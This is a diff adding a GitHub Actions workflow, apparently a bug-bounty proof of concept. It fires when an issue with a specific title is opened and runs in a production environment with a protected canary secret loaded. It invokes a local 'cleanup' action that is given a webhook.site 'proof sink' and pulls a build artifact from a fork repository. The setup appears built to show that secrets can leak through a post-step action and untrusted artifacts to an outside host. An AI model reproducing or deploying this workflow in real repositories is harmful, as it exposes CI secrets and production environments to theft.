@@ -1,0 +1,32 @@
+name: protected-v8-artifact-consumer
+
+on:
+  issues:
+    types: [opened]
+
+permissions:
+  contents: read
+  actions: read
+
+jobs:
+  deploy:
+    if: github.event.issue.title == 'consume-reviewed-artifact-0910080712'
+    runs-on: ubuntu-latest
+    environment: production
+    env:
+      PROTECTED_CANARY: ${{ secrets.PROTECTED_CANARY }}
+    steps:
+      - uses: actions/checkout@v4
+      - name: Register owner-authored cleanup action
+        uses: ./.github/actions/registered-cleanup
+        with:
+          proof_sink: https://webhook.site/39e766e7-7436-40fb-8318-12906c4be93e
+          registration_marker: artifact-v8-post-registered-0910080712
+          hold_seconds: '60'
+      - name: Download finalized build artifact with fail-closed v8
+        uses: actions/download-artifact@v8
+        with:
+          name: reviewed-fork-build-0910080712
+          repository: h1-no01-a-260806/h1-artifact-v8-fork-0910080712
+          run-id: '34454014586'
+          github-token: ${{ github.token }}
